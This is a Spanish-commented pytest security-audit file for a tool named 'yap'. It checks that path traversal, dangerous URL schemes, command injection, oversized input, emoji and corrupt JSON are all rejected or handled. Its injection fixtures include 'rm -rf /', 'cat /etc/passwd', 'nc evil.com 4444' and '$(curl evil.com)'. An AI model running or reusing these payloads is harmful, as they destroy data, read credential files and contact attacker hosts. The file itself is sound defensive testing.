"""
test_yap_security_audit.py — Fuzzing y auditoría de seguridad (#15)

Tests de fuzzing para verificar robustez ante entradas maliciosas:
  1. Path traversal en cargar_curso (../, ..\\, paths absolutos)
  2. Injection en nombres de apps
  3. URLs maliciosas (file://, javascript:, data:, IPs internas)
  4. JSON corrupto en cursos
  5. Entradas muy largas
  6. Caracteres Unicode/emoji
  7. Null bytes
  8. Validación de scheme en webfetch

Ejecucion: python3 -m pytest tests/test_yap_security_audit.py -v
"""

import pytest
import sys
import os
import tempfile
import json
import unittest.mock as mock

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
import yap


class TestPathTraversal:
    """H-01: Path traversal en cargar_curso debe ser bloqueado."""

    def setup_method(self):
        self.tmp_dir = tempfile.mkdtemp()
        self.cursos_dir = os.path.join(self.tmp_dir, "cursos")
        os.makedirs(self.cursos_dir)
        # Create a valid course
        with open(os.path.join(self.cursos_dir, "FPY1101.json"), "w") as f:
            json.dump({
                "codigo": "FPY1101", "nombre": "Test", "horas": 1,
                "semanas": 1, "ras": [], "eas": [], "evaluaciones": []
            }, f)

    def teardown_method(self):
        import shutil
        shutil.rmtree(self.tmp_dir, ignore_errors=True)

    def test_traversal_doble_punto(self):
        """../../etc/passwd debe ser bloqueado."""
        with mock.patch.object(yap, "CURSOS_DIR", self.cursos_dir):
            with pytest.raises((ValueError, FileNotFoundError)):
                yap.cargar_curso("../../etc/passwd")

    def test_traversal_punto_punto_barra(self):
        """../sensitive debe ser bloqueado."""
        with mock.patch.object(yap, "CURSOS_DIR", self.cursos_dir):
            with pytest.raises((ValueError, FileNotFoundError)):
                yap.cargar_curso("../sensitive")

    def test_path_absoluto(self):
        """Path absoluto /etc/passwd debe ser bloqueado."""
        with mock.patch.object(yap, "CURSOS_DIR", self.cursos_dir):
            with pytest.raises((ValueError, FileNotFoundError)):
                yap.cargar_curso("/etc/passwd")

    def test_traversal_windows(self):
        """..\\..\\windows debe ser bloqueado."""
        with mock.patch.object(yap, "CURSOS_DIR", self.cursos_dir):
            with pytest.raises((ValueError, FileNotFoundError)):
                yap.cargar_curso("..\\..\\windows")

    def test_curso_normal_funciona(self):
        """Un código de curso normal debe funcionar."""
        with mock.patch.object(yap, "CURSOS_DIR", self.cursos_dir):
            data = yap.cargar_curso("FPY1101")
            assert data["codigo"] == "FPY1101"

    def test_null_byte_en_codigo(self):
        """Null byte en código debe ser manejado."""
        with mock.patch.object(yap, "CURSOS_DIR", self.cursos_dir):
            with pytest.raises((ValueError, FileNotFoundError)):
                yap.cargar_curso("FPY1101\x00.json")


class TestSchemeValidation:
    """H-02: Solo http/https schemes permitidos en webfetch."""

    def setup_method(self):
        self.tmp_dir = tempfile.mkdtemp()
        self.web_path = os.path.join(self.tmp_dir, "web.conf")
        with open(self.web_path, "w") as f:
            f.write("wikipedia.org\n")

    def teardown_method(self):
        import shutil
        shutil.rmtree(self.tmp_dir, ignore_errors=True)

    def test_file_scheme_bloqueado(self):
        with mock.patch.object(yap, "WHITELIST_WEB", self.web_path):
            result = yap.cmd_webfetch("file:///etc/passwd")
            assert "[ERROR]" in result
            assert "scheme" in result.lower() or "no permitido" in result.lower()

    def test_javascript_scheme_bloqueado(self):
        with mock.patch.object(yap, "WHITELIST_WEB", self.web_path):
            result = yap.cmd_webfetch("javascript:alert(1)")
            assert "[ERROR]" in result

    def test_data_scheme_bloqueado(self):
        with mock.patch.object(yap, "WHITELIST_WEB", self.web_path):
            result = yap.cmd_webfetch("data:text/html,<script>alert(1)</script>")
            assert "[ERROR]" in result

    def test_ftp_scheme_bloqueado(self):
        with mock.patch.object(yap, "WHITELIST_WEB", self.web_path):
            result = yap.cmd_webfetch("ftp://wikipedia.org/file")
            assert "[ERROR]" in result

    def test_http_scheme_permitido(self):
        """http:// con dominio válido no debe dar error de scheme."""
        with mock.patch.object(yap, "WHITELIST_WEB", self.web_path):
            with mock.patch("urllib.request.urlopen") as mock_urlopen:
                mock_resp = mock.MagicMock()
                mock_resp.read.return_value = b"<html>test</html>"
                mock_resp.__enter__ = mock.MagicMock(return_value=mock_resp)
                mock_resp.__exit__ = mock.MagicMock()
                mock_urlopen.return_value = mock_resp
                result = yap.cmd_webfetch("http://wikipedia.org/test")
                assert "[ERROR]" not in result or "scheme" not in result.lower()


class TestAppInjectionFuzz:
    """Fuzzing de injection en nombres de apps."""

    def setup_method(self):
        self.tmp_dir = tempfile.mkdtemp()
        self.apps_path = os.path.join(self.tmp_dir, "apps.conf")
        with open(self.apps_path, "w") as f:
            f.write("Firefox:firefox\n")

    def teardown_method(self):
        import shutil
        shutil.rmtree(self.tmp_dir, ignore_errors=True)

    @pytest.mark.parametrize("payload", [
        "Firefox; rm -rf /",
        "Firefox && cat /etc/passwd",
        "Firefox | nc evil.com 4444",
        "$(curl evil.com)",
        "`id`",
        "Firefox${IFS}rm${IFS}-rf${IFS}/",
        "Firefox\nrm -rf /",
        "Firefox;shutdown -h now",
        "Firefox & disown",
        "Firefox > /dev/null 2>&1; rm -rf /",
    ])
    def test_injection_bloqueado(self, payload):
        """Todos los payloads de injection deben ser bloqueados."""
        with mock.patch.object(yap, "WHITELIST_APPS", self.apps_path):
            result = yap.cmd_open_app(payload)
            assert "[ERROR]" in result


class TestLargeInputFuzz:
    """Entradas muy largas no deben causar crashes."""

    def test_prompt_muy_largo(self):
        """Un prompt de 100KB no debe crashear cmd_query."""
        long_prompt = "A" * 100000
        with mock.patch("subprocess.run") as mock_run:
            mock_run.return_value = mock.MagicMock(
                stdout="ok", stderr="", returncode=0
            )
            result = yap.cmd_query(long_prompt)
            # No debe crashear, debe retornar algo
            assert isinstance(result, str)

    def test_app_name_muy_largo(self):
        """Nombre de app de 10KB debe ser manejado."""
        long_name = "A" * 10000
        tmp_dir = tempfile.mkdtemp()
        apps_path = os.path.join(tmp_dir, "apps.conf")
        with open(apps_path, "w") as f:
            f.write("Firefox:firefox\n")
        with mock.patch.object(yap, "WHITELIST_APPS", apps_path):
            result = yap.cmd_open_app(long_name)
            assert "[ERROR]" in result
        import shutil
        shutil.rmtree(tmp_dir, ignore_errors=True)


class TestUnicodeFuzz:
    """Caracteres Unicode y emoji no deben causar crashes."""

    def test_emoji_en_app_name(self):
        tmp_dir = tempfile.mkdtemp()
        apps_path = os.path.join(tmp_dir, "apps.conf")
        with open(apps_path, "w") as f:
            f.write("Firefox:firefox\n")
        with mock.patch.object(yap, "WHITELIST_APPS", apps_path):
            result = yap.cmd_open_app("🔥💥")
            assert "[ERROR]" in result
        import shutil
        shutil.rmtree(tmp_dir, ignore_errors=True)

    def test_unicode_en_url(self):
        tmp_dir = tempfile.mkdtemp()
        web_path = os.path.join(tmp_dir, "web.conf")
        with open(web_path, "w") as f:
            f.write("wikipedia.org\n")
        with mock.patch.object(yap, "WHITELIST_WEB", web_path):
            result = yap.cmd_webfetch("http://wikipedia.org/🔥")
            # No debe crashear
            assert isinstance(result, str)
        import shutil
        shutil.rmtree(tmp_dir, ignore_errors=True)


class TestCorruptJsonFuzz:
    """JSON corrupto en archivos de configuración debe ser manejado."""

    def test_curso_json_corrupto(self):
        """Un curso con JSON corrupto debe dar error graceful."""
        tmp_dir = tempfile.mkdtemp()
        cursos_dir = os.path.join(tmp_dir, "cursos")
        os.makedirs(cursos_dir)
        with open(os.path.join(cursos_dir, "BROKEN.json"), "w") as f:
            f.write("{not valid json{{{")
        with mock.patch.object(yap, "CURSOS_DIR", cursos_dir):
            with pytest.raises(json.JSONDecodeError):
                yap.cargar_curso("BROKEN")
        import shutil
        shutil.rmtree(tmp_dir, ignore_errors=True)

    def test_progreso_corrupto(self):
        """progress.json corrupto debe retornar dict vacío."""
        tmp_dir = tempfile.mkdtemp()
        prog_file = os.path.join(tmp_dir, "progress.json")
        with open(prog_file, "w") as f:
            f.write("not json{{{")
        with mock.patch.object(yap, "PROGRESS_FILE", prog_file):
            result = yap.cargar_progreso()
            assert result == {"cursos": {}}
        import shutil
        shutil.rmtree(tmp_dir, ignore_errors=True)


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])
